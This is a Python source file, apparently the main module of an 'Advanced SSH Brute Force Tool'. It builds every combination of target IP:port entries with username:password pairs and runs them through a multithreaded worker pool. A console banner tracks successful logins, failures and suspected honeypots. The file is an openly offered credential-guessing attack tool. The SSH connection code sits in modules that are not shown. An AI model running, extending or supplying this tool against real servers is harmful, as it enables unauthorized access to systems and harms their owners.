from __future__ import annotations

import argparse
import shutil
import sys
import threading
import time
from datetime import datetime
from typing import Iterable, List

from . import VERSION
from .config import AppConfig, CONCURRENT_PER_WORKER
from .models import SSHTask
from .utils.files import read_items, write_combo_file
from .utils.time_utils import format_duration
from .workers.pool import Stats, run_pool


def prompt(prompt_text: str) -> str:
    print(prompt_text, end="", flush=True)
    return sys.stdin.readline().strip()


def build_tasks(combo_path: str, ip_path: str) -> List[SSHTask]:
    combos = read_items(combo_path)
    ips = read_items(ip_path)
    tasks: List[SSHTask] = []
    for combo in combos:
        for ip in ips:
            tasks.append(SSHTask(ip=ip[0], port=ip[1], username=combo[0], password=combo[1]))
    return tasks


def banner_thread(start_time: float, stats: Stats, total: int, cfg: AppConfig) -> None:
    last_snapshot = (-1, -1, -1, -1)  # goods, errors, honeypots, total_connections
    min_interval = 0.1
    max_interval = 0.6
    while True:
        goods, errors, honeypots = stats.goods, stats.errors, stats.honeypots
        total_connections = goods + errors + honeypots
        elapsed = max(1e-6, time.perf_counter() - start_time)
        cps = float(total_connections) / elapsed
        remaining = (float(total - total_connections) / cps) if cps > 0 and total_connections < total else 0.0

        snapshot = (goods, errors, honeypots, total_connections)
        should_render = snapshot != last_snapshot or total_connections >= total
        if should_render:
            width = shutil.get_terminal_size((80, 20)).columns
            sep = "=" * max(40, min(width, 120))

            # clear screen (Windows cmd friendly)
            if sys.platform.startswith("win"):
                print("\x1b[2J\x1b[H", end="")
            else:
                print("\033c", end="")

            print(sep)
            print(f"\U0001F680 Advanced SSH Brute Force Tool v{VERSION} \U0001F680")
            print(sep)
            print(f"\U0001F4C1 File: {cfg.ip_file} | \u23F1\uFE0F  Timeout: {cfg.timeout_seconds}s")
            print(f"\U0001F517 Max Workers: {cfg.max_workers} | \U0001F3AF Per Worker: {cfg.concurrent_per_worker}")
            print(sep)
            print(f"\U0001F50D Checked SSH: {total_connections}/{total}")
            print(f"\u26A1 Speed: {cps:.2f} checks/sec")

            if total_connections < total:
                print(f"\u23F3 Elapsed: {format_duration(elapsed)}")
                print(f"\u23F0 Remaining: {format_duration(remaining)}")
            else:
                print(f"\u23F3 Total Time: {format_duration(elapsed)}")
                print("\u2705 Scan Completed Successfully!")

            print(sep)
            print(f"\u2705 Successful: {goods}")
            print(f"\u274C Failed: {errors}")
            print(f"\U0001F36F Honeypots: {honeypots}")

            if total_connections > 0:
                successful_connections = goods + honeypots
                if successful_connections > 0:
                    print(f"\U0001F4CA Success Rate: {(float(goods)/float(successful_connections))*100:.2f}%")
                    print(f"\U0001F36F Honeypot Rate: {(float(honeypots)/float(successful_connections))*100:.2f}%")

            print(sep)
            print(f"| \U0001F5A5\uFE0F Made By Ch4120N with \u2764\uFE0F  |")
            print(f"| \U0001F525 Enhanced Multi-Layer Workers v{VERSION} \U0001F525 |")
            print(f"| \U0001F6E1\uFE0F  No License Required \U0001F6E1\uFE0F   |")
            print(sep)

            last_snapshot = snapshot

        if total_connections >= total:
            break
        # adapt refresh interval based on speed
        interval = max(min_interval, min(max_interval, 1.0 / (cps + 1e-6)))
        time.sleep(interval)


def main() -> None:
    parser = argparse.ArgumentParser(description="Advanced SSH brute force and honeypot detection tool (Python port)")
    parser.add_argument("--ips", required=True, help="Path to IP list file (format: ip:port per line)")
    parser.add_argument("--timeout", type=int, required=True, help="Timeout in seconds for SSH connection and commands")
    parser.add_argument("--workers", type=int, required=True, help="Maximum number of worker threads")
    parser.add_argument("--combo", help="Path to prebuilt combo file (username:password per line)")
    parser.add_argument("--usernames", help="Path to username list file (one per line)")
    parser.add_argument("--passwords", help="Path to password list file (one per line)")

    args = parser.parse_args()

    # Determine combo source
    combo_path = args.combo
    username_file = args.usernames
    password_file = args.passwords
    if combo_path is None:
        if not (username_file and password_file):
            parser.error("Provide --combo or both --usernames and --passwords")
        write_combo_file(read_items(username_file), read_items(password_file), "combo.txt")
        combo_path = "combo.txt"

    ip_file = args.ips
    timeout_seconds = args.timeout
    max_workers = args.workers

    cfg = AppConfig(
        timeout_seconds=timeout_seconds,
        max_workers=max_workers,
        concurrent_per_worker=CONCURRENT_PER_WORKER,
        ip_file=ip_file,
        username_file=username_file or "",
        password_file=password_file or "",
    )

    tasks = build_tasks(combo_path, ip_file)
    total = len(tasks)
    stats = Stats()

    start = time.perf_counter()
    banner = threading.Thread(target=banner_thread, args=(start, stats, total, cfg), daemon=True)
    banner.start()

    run_pool(tasks, max_workers, timeout_seconds, stats)
    banner.join()


if __name__ == "__main__":
    main()

